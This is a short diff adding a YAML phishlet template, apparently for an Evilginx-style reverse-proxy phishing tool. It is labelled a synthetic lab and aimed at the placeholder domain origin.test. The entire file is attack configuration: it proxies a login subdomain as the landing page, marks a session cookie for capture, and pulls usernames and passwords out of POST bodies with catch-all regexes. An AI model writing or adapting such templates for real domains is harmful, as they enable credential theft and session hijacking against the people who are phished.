@@ -1,0 +1,15 @@
+# Synthetic origin only; this template contains no production service endpoints.
+author: Raptix isolated provider lab
+min_ver: '3.3.0'
+params:
+  - {name: label, default: lab}
+proxy_hosts:
+  - {phish_sub: login, orig_sub: login, domain: origin.test, session: true, is_landing: true}
+auth_tokens:
+  - {domain: login.origin.test, keys: [lab_session], type: cookie}
+credentials:
+  username: {key: username, search: '(.*)', type: post}
+  password: {key: password, search: '(.*)', type: post}
+login:
+  domain: login.origin.test
+  path: /
